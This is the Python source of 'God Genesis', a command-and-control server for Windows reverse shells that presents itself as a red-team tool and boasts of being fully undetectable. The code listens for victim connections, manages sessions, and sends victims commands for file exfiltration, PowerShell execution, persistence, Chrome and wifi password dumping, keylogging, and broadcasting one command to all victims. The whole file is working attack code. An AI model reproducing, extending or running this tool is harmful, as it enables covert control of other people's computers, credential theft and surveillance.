import os
import json
import socket
import getpass
import readline
import argparse
import threading
import subprocess
from assets.banner import banner
from assets.payload_builder import build_payload


def completer(text, state):
    options = [i for i in commands if i.startswith(text)]
    if state < len(options):
        return options[state]
    else:
        return None

readline.parse_and_bind("tab: complete")
readline.set_completer(completer)


def sendtoall(target,data):
    json_data = json.dumps(data)
    connection_to_attacker.send(json_data.encode())


def server():
    while True:
        if stop_threads:
            break
        connection_to_victim.settimeout(1)
        try:
            target, ip = connection_to_victim.accept()
            targets.append(target)
            ips.append(ip)
            print(str(ip) + " Has Connected To GOD GENESIS." )
        except:
            pass


def shell(target, ip):

    def reliable_send(data):
        json_data = json.dumps(data)
        target.send(json_data.encode())


    def reliable_recv():
        data = ""
        while True:
            try:
                data = data + target.recv(1024).decode().rstrip()
                return json.loads(data)
            except ValueError:
                continue


    def download_file(file_name):
        f = open(file_name, 'wb')
    #target.settimeout(1)
        while True:
            chunk = target.recv(1024)
            if chunk.endswith('DONE'.encode()):
                f.write(chunk[:-4])
                f.close()
                break
            f.write(chunk)
        

    def upload_file(file_name):
        f = open(file_name, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            target.send(packet)
            packet = f.read(1024)
        target.send('DONE'.encode())


    while True:
        command = input(f"{target}> ")
        reliable_send(command)
        if command == 'terminate':
            target.close()
            targets.remove(target)
            ips.remove(target)
            break

        elif command == 'exit':
            break
            
        elif command == 'clear':
            os.system('clear')
        
        elif command[:3] == 'cd ':
            files = reliable_recv()
            print("Current Directory: ",files)
            pass
    
        elif command[:3] == 'pwd':
            files = reliable_recv()
            print("You are now at: ", files)

        elif command[:9] == 'download ':
            download_file(command[9:])

        elif command[:7] == 'upload ':
            upload_file(command[7:])

        elif command == 'user':
            detail = reliable_recv()
            print("The User Name Is : ",detail)
        
        elif command == 'info':
            result = reliable_recv()
            print(result)

        elif command == 'sc':
            result = reliable_recv()
            print(result)

        elif command == 'start':
            pass

        elif command == 'env':
            env_var = reliable_recv()
            print(env_var)

        elif command == 'av':
            result=reliable_recv()
            print(result)

        elif command == 'python3_install':
            pass     

        elif command == 'keylogger':
            print("keylogger started...")
            continue
        elif command == "help":
            print('''\n
                ===================================================================================================
                  BASIC COMMANDS:
                ===================================================================================================
                            help                  --> Show This Options
                            terminate             --> Exit The Shell Completely
                            exit                  --> Shell Works In Background And Prompted To C2 Server
                            clear                 --> Clear The Previous Outputs

                ===================================================================================================
                  SYSTEM COMMANDS:
                ===================================================================================================
                            cd                    --> Change Directory
                            pwd                   --> Prints Current Working Directory
                            mkdir *dir_name*      --> Creates A Directory Mentioned
                            rm *dir_name*         --> Deletes A Directoty Mentioned
                            powershell [command]  --> Run Powershell Command
                            start *exe_name*      --> Start Any Executable By Giving The Executable Name

                ===================================================================================================
                  INFORMATION GATHERING COMMANDS:
                ===================================================================================================
                            env                   --> Checks Enviornment Variables
                            sc                    --> Lists All Services Running
                            user                  --> Current User
                            info                  --> Gives Us All Information About Compromised System
                            av                    --> Lists All antivirus In Compromised System

                ===================================================================================================
                  DATA EXFILTRATION COMMANDS:
                ===================================================================================================
                            download *file_name*  --> Download Files From Compromised System
                            upload *file_name*    --> Uploads Files To Victim Pc


                ===================================================================================================
                  EXPLOITATION COMMANDS:
                ===================================================================================================
                            persistence1          --> Persistance Via Method 1
                            persistence2          --> Persistance Via Method 2
                            get                   --> Download Files From Any URL
                            chrome_pass_dump      --> Dump All Stored Passwords From Chrome Bowser
                            wifi_password         --> Dump Passwords Of All Saved Wifi Networks
                            keylogger             --> Starts Key Logging Via Keylogger
                            dump_keylogger        --> Dump All Logs Done By Keylogger 
                            python_install        --> Installs Python In Victim Pc Without UI

                            

                            ''')
        else:
            result = reliable_recv()
            print(result)
            
    
"""
Creating and parsing arguments
-i/--ip for specifying attacker's  ip.
-p/--port for specifying port on attackers machine, where the connection will be established
"""                
def create_parser():
    parser = argparse.ArgumentParser("GodGenesis — Fʀᴏᴍ Tʜᴇ Hᴏᴜsᴇ Oғ IEM(BCA) Mᴀᴅᴇ Bʏ Tᴇᴀᴍ BCAN 420", epilog="God Genesis is a C2 server purely coded in Python3 created to help Red Teamers and Penetration Testers. Currently It only supports TCP reverse shell but wait a min, its a FUD and can give u admin shell from any targeted WINDOWS Machine.")
    parser.add_argument("mode", help="options:  [build, listen]", choices=["build", "listen"])
    parser.add_argument("-i", "--ip",help="ip")
    parser.add_argument("-p", "--port", type=int, help="port")
    parser.add_argument("-o", "--outfile", help="specify a name for the built payload")
    return parser
      

parser = create_parser()
args = parser.parse_args()

print(banner)
if args.mode == "build":
    build_payload(args)
elif args.mode == "listen":
    ips = []
    targets = []
    stop_threads = False
    connection_to_victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection_to_victim.bind((args.ip, args.port))
    connection_to_victim.listen(10)
    t1 = threading.Thread(target=server)
    t1.start()
    print(f"[+] Listening For Incoming Connection: {args.ip}:{args.port}... \n")
    
    while True:
        command = input(f"{getpass.getuser()}@God-Genesis-C2-Server: ")
        if command == "sessions -l":
            count = 0
            for ip in ips:
                print("Session " + str(count) + " : " + str(ip))
                count += 1
                
        elif command[:11] == "sessions -i":
            try:
                num = int(command[12:])
                targets_num = targets[num]
                targets_ip = ips[num]
                shell(targets_num, targets_ip)
            except:
                print("GOD GENESIS doesn't recognize any session with that number")
                
        elif command == 'clear':
            subprocess.run(['clear'], shell=False)
            
        elif command[:7] == 'sendall':
            x = len(targets)
            print(x)
            i = 0
            try:
                while i < x:
                    tarnumber = targets[i]
                    print(tarnumber)
                    sendtoall(tarnumber, command)
                    i += 1
            except Exception as e:
                print(f'Failed: {e}')
                
        elif command == 'shell_help':
            print('''\n
                            help                 --> Show this options
                            terminate            --> Exit the shell
                            clear                --> Clear the previous outputs
                            cd                   --> Change Directory
                            pwd                  --> Prints Current Working Directory
                            python_install       --> Installs python in victim pc
                            env                  --> Checks Enviornment Variables
                            sc                   --> Lists all services running
                            user                 --> Current user
                            info                 --> Gives us full information about victim pc
                            download             --> Download files from compromised system
                            upload               --> uploads file to victim pc
                            persistence1         --> Persistance via method 1
                            persistence2         --> Persistance via method 2
                            get                  --> Sends file from attacker pc and executes at victim pc
                            av                   --> Lists all antivirus
                            chrome_pass_dump     --> Dump all stored passwords in chrome browser
                            wifi_password        --> Dump passwords of all saved wifi networks
                            keyboard_capture            --> Starts logging via keylogger
                            dump_keylogger       --> Dump all logs done by keylogger as of now
                            powershell [command] --> Run Powershell Command
                            start                --> Start any executable by giving the executable name 
                            sessions -l          --> List Down All The Victims Connected To C2 Server
                            sessions -i [session number]  --> Interact With Each Sessions Individually
                            sendall              --> Send Same Command To All The Victim's System
                            ''')
        elif command == 'help':
            print("""
            sessions -l          --> List Down All The Victims Connected To C2 Server
            sessions -i [session number]  --> Interact With Each Sessions Individually
            sendall              --> Send Same Command To All The Victim's System      
            shell_help           --> All commands before and after getting shell
            """)
            
        else:
            print(f"Command Not Found: {command}")

elif args.ip == None or args.port == None:
    print("God Genesis C2: Specify IP/PORT")
